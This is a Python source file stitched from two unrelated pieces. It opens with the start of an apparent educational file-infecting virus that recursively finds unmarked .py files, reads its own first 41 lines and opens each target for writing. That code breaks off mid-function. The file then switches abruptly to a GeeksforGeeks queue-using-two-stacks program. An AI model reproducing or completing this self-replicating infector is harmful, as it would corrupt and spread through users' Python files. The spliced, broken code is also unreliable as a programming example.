#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to implement Queue using
# two stacks with costly enQueue()
 
class Queue:
    def __init__(self):
        self.s1 = []
        self.s2 = []
 
    def enQueue(self, x):
         
        # Move all elements from s1 to s2
        while len(self.s1) != 0:
            self.s2.append(self.s1[-1])
            self.s1.pop()
 
        # Push item into self.s1
        self.s1.append(x)
 
        # Push everything back to s1
        while len(self.s2) != 0:
            self.s1.append(self.s2[-1])
            self.s2.pop()
 
    # Dequeue an item from the queue
    def deQueue(self):
         
            # if first stack is empty
        if len(self.s1) == 0:
            print("Q is Empty")
     
        # Return top of self.s1
        x = self.s1[-1]
        self.s1.pop()
        return x
 
# Driver code
if __name__ == '__main__':
    q = Queue()
    q.enQueue(1)
    q.enQueue(2)
    q.enQueue(3)
 
    print(q.deQueue())
    print(q.deQueue())
    print(q.deQueue())
 
# This code is contributed by PranchalK
# Time Complexity: Push Operation: O(N) - in worst case we have empty whole of stack 1 into stack 2.
# Pop operation: O(1) - Same as pop operation in stack
# Space Complexity: O(N) Use of stack for storing values